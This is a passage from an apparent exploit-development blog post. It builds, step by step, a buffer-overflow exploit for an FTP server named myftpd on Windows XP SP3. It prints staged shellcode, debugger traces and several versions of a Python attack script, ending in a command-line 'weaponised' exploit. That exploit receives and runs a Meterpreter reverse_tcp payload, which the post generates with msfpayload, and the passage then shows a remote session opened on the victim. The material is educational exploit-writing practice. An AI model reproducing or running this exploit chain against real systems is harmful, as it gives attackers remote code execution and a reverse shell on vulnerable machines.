The second parameter to a `bind` call is the socket address structure, which means the address stored in `ESP+4` is the one we're interested in. Here we can see that the value being stored here is `myftpd.00407434`, which is the global variable containing the socket address.

We're going to abuse the knowledge of the location of this thing and reuse it in our call. Note that we can't bind to the same socket, so we'll just increment the socket number prior to making our call. The address is `0x00407434`, which just happens to be `0x4000` past our current `EBX` value. We'll abuse this fact to get the value bumped quicky, and then we'll increment the port number:

```
MOV EDI, EAX          ; Store the socket handle somewhere else
MOV ECX, EBX          ; Copy EBX to ECX for munging
MOV CH, 0x74          ; Bump the address up to the right value
INC BYTE [ECX+3]      ; Update the port from 21 to 22
```

So now we've bumped our port, and we have the `sockaddr` pointer in `ECX` we can now call bind. We know that the size of this structure is 16 bytes and have our socket handle ready in `EDI`. With our parameters ready to go, we can adjust `EBX` to point to `bind`, push our stuff onto the stack and make the call:

```
MOV BL, 0x54          ; Point EBX at `bind`
PUSH 0x10             ; Push 16 for the size of the struct
PUSH ECX              ; Push the sockaddr struct pointer
PUSH EDI              ; Push the socket handle
CALL EBX              ; Invoke bind
```

OK, we're starting to get the hang of this. Let's see what our script looks like prior to running it this time:

```
#!/usr/bin/python

import socket, struct

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

# Hard coded target for now
target = targets[0]

print "[*] Attacking {0}:{1} ...".format(host, port)

block1  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
block1 += "\xB0\x06"                           # MOV AL, 0x6
block1 += "\x50"                               # PUSH EAX
block1 += "\xB0\x01"                           # MOV AL, 0x1
block1 += "\x50"                               # PUSH EAX
block1 += "\x40"                               # INC EAX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `socket`
block1 += "\xFF\xD3"                           # CALL EBX
# save our socket handle
block1 += "\x89\xC7"                           # MOV EDI, EAX
# Find sockaddr
block1 += "\x89\xD9"                           # MOV ECX, EBX
block1 += "\xB5\x74"                           # MOV CH, 0x74
# adjust the port number by bumping it up one to 22
block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
# adjust the call pointer to reference bind
block1 += "\xB3\x54"                           # MOV BL, 0x54
# prepare the parameters on the stack for the bind call
block1 += "\x6A\x10"                           # PUSH 0x10
block1 += "\x51"                               # PUSH ECX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `bind`
block1 += "\xFF\xD3"                           # CALL EBX
# set a breakpoint so we can see what's going on
block1 += "\xCC"

command  = ""
command += "Z" * (offsets['SC'] - len(command))
command += "B" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += "C" * (offsets['ESP'] - len(command))
command += block1
command += "E" * (max_size - len(command))

print "[*] Command {0} chars...".format(len(command))
pwn(command)
```

And with this script invoked, we see the following shellcode in Immunity:

```
00B5FFC0   83EC 7C          SUB ESP,7C
00B5FFC3   BB 44343440      MOV EBX,40343444
00B5FFC8   C1EB 08          SHR EBX,8
00B5FFCB   B0 06            MOV AL,6
00B5FFCD   50               PUSH EAX
00B5FFCE   B0 01            MOV AL,1
00B5FFD0   50               PUSH EAX
00B5FFD1   40               INC EAX
00B5FFD2   50               PUSH EAX
00B5FFD3   FFD3             CALL EBX
00B5FFD5   89C7             MOV EDI,EAX
00B5FFD7   89D9             MOV ECX,EBX
00B5FFD9   B5 74            MOV CH,74
00B5FFDB   FE41 03          INC BYTE PTR DS:[ECX+3]
00B5FFDE   B3 54            MOV BL,54
00B5FFE0   6A 10            PUSH 10
00B5FFE2   51               PUSH ECX
00B5FFE3   50               PUSH EAX
00B5FFE4   FFD3             CALL EBX
```

And at the end of this run the registers look like this:

```
EAX 00000000
ECX 0024CF98
EDX 0024C890
EBX 00403454 <JMP.&WS2_32.bind>
ESP 00B5FF44
EBP 42424242
ESI 42424242
EDI 00000084
EIP 00B5FFE7
O 0  LastErr ERROR_SUCCESS (00000000)
```

This shows that `bind` returned `0` (which is good) and that the `LastErr` is success. All is well so far! All we need now are `listen`, `accept` and `recv`. `listen` is a really simple call which takes the socket handle and a backlog counter. So let's move `EBX` to point to this function first, then set up the stack before doing the call:

```
MOV BL, 0x5C          ; Point EBX at `listen`
PUSH 0x7F             ; Specify a big backlog
PUSH EDI              ; Pass in the socket
CALL EBX              ; Invoke listen
```

Let's give that a crack in our script:

```
#!/usr/bin/python

import socket, struct

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

# Hard coded target for now
target = targets[0]

print "[*] Attacking {0}:{1} ...".format(host, port)

block1  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
block1 += "\xB0\x06"                           # MOV AL, 0x6
block1 += "\x50"                               # PUSH EAX
block1 += "\xB0\x01"                           # MOV AL, 0x1
block1 += "\x50"                               # PUSH EAX
block1 += "\x40"                               # INC EAX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `socket`
block1 += "\xFF\xD3"                           # CALL EBX
# save our socket handle
block1 += "\x89\xC7"                           # MOV EDI, EAX
# Find sockaddr
block1 += "\x89\xD9"                           # MOV ECX, EBX
block1 += "\xB5\x74"                           # MOV CH, 0x74
# adjust the port number by bumping it up one to 22
block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
# adjust the call pointer to reference `bind`
block1 += "\xB3\x54"                           # MOV BL, 0x54
# prepare the parameters on the stack for the `bind` call
block1 += "\x6A\x10"                           # PUSH 0x10
block1 += "\x51"                               # PUSH ECX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `bind`
block1 += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `listen`
block1 += "\xB3\x5C"                           # MOV BL, 0x5C
# prepare the parameters on the stack for the `listen` call
block1 += "\x6A\x7F"                           # PUSH 0x7F
block1 += "\x57"                               # PUSH EDI
# invoke the call to `listen`
block1 += "\xFF\xD3"                           # CALL EBX
# set a breakpoint so we can see what's going on
block1 += "\xCC"

command  = ""
command += "Z" * (offsets['SC'] - len(command))
command += "B" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += "C" * (offsets['ESP'] - len(command))
command += block1
command += "E" * (max_size - len(command))

print "[*] Command {0} chars...".format(len(command))
pwn(command)
```

And this is what we get as shellcode:

```
00B5FFC0   83EC 7C          SUB ESP,7C
00B5FFC3   BB 44343440      MOV EBX,40343444
00B5FFC8   C1EB 08          SHR EBX,8
00B5FFCB   B0 06            MOV AL,6
00B5FFCD   50               PUSH EAX
00B5FFCE   B0 01            MOV AL,1
00B5FFD0   50               PUSH EAX
00B5FFD1   40               INC EAX
00B5FFD2   50               PUSH EAX
00B5FFD3   FFD3             CALL EBX
00B5FFD5   89C7             MOV EDI,EAX
00B5FFD7   89D9             MOV ECX,EBX
00B5FFD9   B5 74            MOV CH,74
00B5FFDB   FE41 03          INC BYTE PTR DS:[ECX+3]
00B5FFDE   B3 54            MOV BL,54
00B5FFE0   6A 10            PUSH 10
00B5FFE2   51               PUSH ECX
00B5FFE3   50               PUSH EAX
00B5FFE4   FFD3             CALL EBX
00B5FFE6   CC               INT3
00B5FFE7   B3 5C            MOV BL,5C
00B5FFE9   6A 7F            PUSH 7F
00B5FFEB   57               PUSH EDI
00B5FFEC   FFD3             CALL EBX
```

With the registers containing the following successful result:

```
EAX 00000000
ECX 0024CF98
EDX 00000000
EBX 0040345C <JMP.&WS2_32.listen>
ESP 00B5FF44
EBP 42424242
ESI 42424242
EDI 00000084
EIP 00B5FFEE
O 0  LastErr ERROR_SUCCESS (00000000)
```

Making good progress. Now we need to start accepting new connections on our socket, for that we get `accept` set up. The call would normally look like `accept(socket, NULL, NULL)`, but we're in a great spot because `ESP` current points to the middle of bunch of zeros, which means the two `NULL` values are effectively already pushed. This means we save instructions by not pushing them. Instead, we just adjust `EBX` to point at `accept`, push our socket handle and make the call:

```
MOV BL, 0x24          ; Point EBX at `accept`
PUSH EDI              ; Pass in the socket
CALL EBX              ; Invoke accept
```

Now this is where it starts to get interesting, because this call is a blocking call. As a result, we need to have our attacker script connect to the bind port for the script to continue. We'll make another call to the server on the next port (22) and for this we'll be sending the payload that we want executed on the server. For now, this payload will be a dummy payload, but in future it will be any payload we want. This is what the exploit looks like now:

```
#!/usr/bin/python

import socket, struct, time

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload, port, recv = True):
  print "[*] Sending {0} bytes to {1}:{2}...".format(len(payload), host, port)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  if recv:
    s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

# Hard coded target for now
target = targets[0]

print "[*] Attacking {0}:{1} ...".format(host, port)

block1  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
block1 += "\xB0\x06"                           # MOV AL, 0x6
block1 += "\x50"                               # PUSH EAX
block1 += "\xB0\x01"                           # MOV AL, 0x1
block1 += "\x50"                               # PUSH EAX
block1 += "\x40"                               # INC EAX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `socket`
block1 += "\xFF\xD3"                           # CALL EBX
# save our socket handle
block1 += "\x89\xC7"                           # MOV EDI, EAX
# Find sockaddr
block1 += "\x89\xD9"                           # MOV ECX, EBX
block1 += "\xB5\x74"                           # MOV CH, 0x74
# adjust the port number by bumping it up one to 22
block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
# adjust the call pointer to reference `bind`
block1 += "\xB3\x54"                           # MOV BL, 0x54
# prepare the parameters on the stack for the `bind` call
block1 += "\x6A\x10"                           # PUSH 0x10
block1 += "\x51"                               # PUSH ECX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `bind`
block1 += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `listen`
block1 += "\xB3\x5C"                           # MOV BL, 0x5C
# prepare the parameters on the stack for the `listen` call
block1 += "\x6A\x7F"                           # PUSH 0x7F
block1 += "\x57"                               # PUSH EDI
# invoke the call to `listen`
block1 += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `accept`
block1 += "\xB3\x24"                           # MOV BL, 0x24
# prepare the parameters on the stack for the `accept` call
block1 += "\x57"                               # PUSH EDI
# invoke the call to `accept`
block1 += "\xFF\xD3"                           # CALL EBX
# set a breakpoint so we can see what's going on
block1 += "\xCC"

command  = ""
command += "Z" * (offsets['SC'] - len(command))
command += "B" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += "C" * (offsets['ESP'] - len(command))
command += block1
command += "E" * (max_size - len(command))

# send the initial exploit
pwn(command, port)
# wait a sec for the port to be bound
time.sleep(1)
# Send the payload on the bind port
pwn("AAA", port + 1)
```

Resulting shellcode that appears in memory looks like this:

```
00B5FFC0   83EC 7C          SUB ESP,7C
00B5FFC3   BB 44343440      MOV EBX,40343444
00B5FFC8   C1EB 08          SHR EBX,8
00B5FFCB   B0 06            MOV AL,6
00B5FFCD   50               PUSH EAX
00B5FFCE   B0 01            MOV AL,1
00B5FFD0   50               PUSH EAX
00B5FFD1   40               INC EAX
00B5FFD2   50               PUSH EAX
00B5FFD3   FFD3             CALL EBX
00B5FFD5   89C7             MOV EDI,EAX
00B5FFD7   89D9             MOV ECX,EBX
00B5FFD9   B5 74            MOV CH,74
00B5FFDB   FE41 03          INC BYTE PTR DS:[ECX+3]
00B5FFDE   B3 54            MOV BL,54
00B5FFE0   6A 10            PUSH 10
00B5FFE2   51               PUSH ECX
00B5FFE3   50               PUSH EAX
00B5FFE4   FFD3             CALL EBX
00B5FFE6   B3 5C            MOV BL,5C
00B5FFE8   6A 7F            PUSH 7F
00B5FFEA   57               PUSH EDI
00B5FFEB   FFD3             CALL EBX
00B5FFED   B3 24            MOV BL,24
00B5FFEF   57               PUSH EDI
00B5FFF0   FFD3             CALL EBX
```

By now you'll notice that the last call blocks until our attacker script connects the second time. After this, the registers look like this:

```
EAX 000000A4
ECX 0024A888
EDX 00000009
EBX 00403424 <JMP.&WS2_32.accept>
ESP 00B5FF4C
EBP 42424242
ESI 42424242
EDI 00000084
EIP 00B5FFF3
O 0  LastErr ERROR_SUCCESS (00000000)
```

Another round of success, only this time we have a meaningful value in `EAX` that we need to keep. This is the _accept socket_ handle, which is the handle that points to the client that has just connected. This is the handle we need to pass to `recv` in order pull data from the attacker. We don't need our bind socket handle any more so the first thing we do is persist this in `EDI`.

```
MOV EDI, EAX          ; Stash the new accept socket
```

The final hurdle is the call to `recv`, but this comes with a caveat: we need to give `recv` a handle to an area of memory that is readable, writable and executable (RWX). Originally I had built this exploit to just reuse a part of the stack, but that didn't port too well to other operating system versions so instead, I thought allocating memory and changing its protection would make more sense. Let's get the `malloc` function ready, the abuse the socket handle value in `EAX` to create a sane buffer size which we push twice (one as a param to `malloc` and the other to persist the value across calls).

As this point we're out of bytes in our first block (actually, just before making the call we run out of bytes). So we need to jmp back to the start of our shellcode with a `JMP` instruction and carry on from there:

```
MOV BX,3DD4           ; Set EBX up for the `malloc` call
MOV AH,AL             ; use the socket handle as a size fudger
PUSH EAX              ; push for size persistence for later use
CALL EBX              ; Invoke `malloc`
JMP <address>         ; Jmp back to the start of block 2
```

The result of `malloc` is memory which needs to be marked as executable, and that lives in `EAX`. We'll push this value on the stack for later use, and then set up the virtual protect call:

```
POP ECX, PUSH ECX     ; get a copy of the size in ECX
MOV ESI, EAX          ; save the memory handle for later use
PUSH EAX              ; push the handle onto the stack as well
MOV BX,0x3EA4         ; Set EBX up for the `virtualprotect` call
LEA EAX, [ESP-0x24]   ; Calculate somewhere sane on the stack
PUSH EAX              ; Push this value as the buffer for the old protection
PUSH 0x40             ; Mark the area as RWX
PUSH ECX              ; specify the memory size to change protection on
PUSH ESI              ; Point to the memory to protect
CALL EBX              ; Invoke `VirtualProtect`
```

The beauty of this approach is that the stack is currently set up ready to call `recv` except for the socket handle, all we need to do adjust for the function and call it. We have another issue here though because the address contains an `0C` which is a bad character. So instead we use Mona.py again to tell us a reference point for `recv` using the `iat` command. This gives us an address located at `0x004082DC`. We can use this address instead and call using `CALL [EBX]` instead.

```
MOV BX,82DC           ; Set EBX up for the `recv` call, but can't use 0C because it's "bad"
PUSH EDI              ; push the socket handle
```

But wait! We can't invoke `recv` because we have run out of space, we have to make use of the last 4 bytes we have tucked away, so to do this we need to jump ahead by 5 bytes. There we can invoke the call:

```
CALL [EBX]            ; Call `recv`
```

And the icing on the cake, `ESI` containers the memory pointer the payload was written to, so we just jump there and off we go!

```
JMP ESI               ; Invoke the received payload
```

If we exclude the 1 blank that is placed after block2, we literally have zero bytes left to play with. Talk about cutting it fine!

## Finishing up

Now before our final run, we'll need to generate a payload that we want to execute. In my case I'm going to use a meterpreter payload:

```
$ msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.10.40 LPORT=8000 R > revmet8000.bin
```

I'm going to use this as the content that I sent to the server at the end of the exploit. We'll actually pass this in on the command line from here.

And so with a few more adjustments and some spit'n'polish, we have a weaponised exploit ready to go (breakpoint free!) that looks like this:

```
#!/usr/bin/python

import socket, struct, time, sys

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

if len(sys.argv) != 5:
  print "Usage: {0} <target> <host> <port> <payload>".format(sys.argv[0])
  print "   Targets:"
  for i in range(0, len(targets)):
    print "     {0}: {1}".format(i, targets[i]['Name'])
  print "Eg. {0} 0 127.0.0.1 21 revshell.bin".format(sys.argv[0])
  sys.exit(1)

target = targets[int(sys.argv[1])]
host = sys.argv[2]
port = int(sys.argv[3])
payload_file = sys.argv[4]

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload, port, recv = True):
  print "[*] Sending {0} bytes to {1}:{2}...".format(len(payload), host, port)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  if recv:
    s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

print "[*] Attacking {0}:{1} ...".format(host, port)

block1  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
block1 += "\xB0\x06"                           # MOV AL, 0x6
block1 += "\x50"                               # PUSH EAX
block1 += "\xB0\x01"                           # MOV AL, 0x1
block1 += "\x50"                               # PUSH EAX
block1 += "\x40"                               # INC EAX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `socket`
block1 += "\xFF\xD3"                           # CALL EBX
# save our socket handle
block1 += "\x89\xC7"                           # MOV EDI, EAX
# Find sockaddr
block1 += "\x89\xD9"                           # MOV ECX, EBX
block1 += "\xB5\x74"                           # MOV CH, 0x74
# adjust the port number by bumping it up one to 22
block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
# adjust the call pointer to reference `bind`
block1 += "\xB3\x54"                           # MOV BL, 0x54
# prepare the parameters on the stack for the `bind` call
block1 += "\x6A\x10"                           # PUSH 0x10
block1 += "\x51"                               # PUSH ECX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `bind`
block1 += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `listen`
block1 += "\xB3\x5C"                           # MOV BL, 0x5C
# prepare the parameters on the stack for the `listen` call
block1 += "\x6A\x7F"                           # PUSH 0x7F
block1 += "\x57"                               # PUSH EDI
# invoke the call to `listen`
block1 += "\xFF\xD3"                           # CALL EBX
# adjust the call pointer to reference `accept`
block1 += "\xB3\x24"                           # MOV BL, 0x24
# prepare the parameters on the stack for the `accept` call
block1 += "\x57"                               # PUSH EDI
# invoke the call to `accept`
block1 += "\xFF\xD3"                           # CALL EBX
# prepare for the malloc call and call it
block1 += "\x8B\xF8"                           # MOV EDI, EAX
block1 += "\x66\xBB\xD4\x3D"                   # MOV BX, 0x3DD4
block1 += "\x8A\xE0"                           # MOV AH, AL
block1 += "\x50"                               # PUSH EAX
block1 += "\xFF\xD3"                           # CALL EBX
block1 += "\xEB\x9D"                           # JMP BLOCK2


block2  = ""
# invoke the call to `malloc`
block2 += "\x59\x51"                           # POP ECX, PUSH ECX
# save the memory handle, and push it up ready for later use
block2 += "\x8B\xF0"                           # MOV ESI, EAX
block2 += "\x50"                               # PUSH EAX
# set up virtual protect call
block2 += "\x66\xBB\xA4\x3E"                   # MOV BX, 0x3EA4
block2 += "\x8D\x44\x24\xDC"                   # LEA EAX, [ESP-0x24]
block2 += "\x50"                               # PUSH EAX
block2 += "\x6A\x40"                           # PUSH 0x40
block2 += "\x51"                               # PUSH ECX
block2 += "\x56"                               # PUSH ESI
# call virtual protect
block2 += "\xFF\xD3"                           # CALL EBX
# prep the call for recv
block2 += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
block2 += "\x57"                               # PUSH EDI
# jump to tucked block
block2 += "\xEB\x05"                           # JMP <5 bytes forward>

tucked  = ""
# call recv
tucked += "\xFF\x13"                           # CALL [EBX]
# invoke the payload
tucked += "\xFF\xE6"                           # JMP ESI

command  = ""
command += "Z" * (offsets['SC'] - len(command))
command += block2
command += "B" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += tucked
command += block1
command += "E" * (max_size - len(command))

# send the initial exploit
pwn(command, port)
# wait a sec for the port to be bound
time.sleep(1)
# Send the payload on the bind port
pwn(read_file(payload_file), port + 1, False)
```

Armed with this, we can set up a Meterpreter listener:

```
msf exploit(handler) > exploit

[*] Started reverse handler on 10.1.10.40:8000 
[*] Starting the payload handler...
```

Launch our script at the application:
```
$ ./sploit.py 0 10.1.10.34 21 ./revmet8000.bin
[*] Attacking 10.1.10.34:21 ...
[*] Sending 365 bytes to 10.1.10.34:21...
[*] Sending 314 bytes to 10.1.10.34:22...
```

Watch the magic happen:

![FTP pwnage](/uploads/2014/03/04-magic.png)

And enjoy a Meterpreter shell:

```
[*] Sending stage (787456 bytes) to 10.1.10.34
[*] Meterpreter session 2 opened (10.1.10.40:8000 -> 10.1.10.34:3779) at 2014-03-01 01:20:04 +1000

meterpreter > getuid
Server username: OJ-75E3B8CC9475\bob
meterpreter > sysinfo
Computer        : OJ-75E3B8CC9475
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Meterpreter     : x86/win32
```

## Last thoughts

Adding new Windows XP based targets to this is a breeze, and is left as an exercise for the reader. I plan to do a future post on how to make this bypass ASLR, but I'm not sure when I'll get to it. Writing these things up takes way longer than exploiting them in the first place.

I hope you enjoyed the reading. Comments and questions are always welcome, as are corrections for fails and typos.

  [OSCE]: http://buffered.io/posts/osce-and-me/
  [ExploitDB]: http://exploit-db.com/
  [Corelan]: https://www.corelan.be/
  [Fuzzy Security]: http://www.fuzzysecurity.com/
  [CTF]: https://en.wikipedia.org/wiki/Capture_the_flag
  [ShellStorm]: http://www.shell-storm.org/
  [Ammar]: http://clog.ammar.web.id/2013/06/idsecconf-2013-ctff-offline-challenge.html
  [idsecconf]: http://2013.idsecconf.org/
  [Meterpreter]: https://github.com/rapid7/meterpreter
  [Immunity Debugger]: https://www.immunityinc.com/products-immdbg.shtml
  [Mona.py]: http://redmine.corelan.be/projects/mona
  [Corelanc0d3r]: https://twitter.com/corelanc0d3r
  [muts]: https://twitter.com/kalilinux

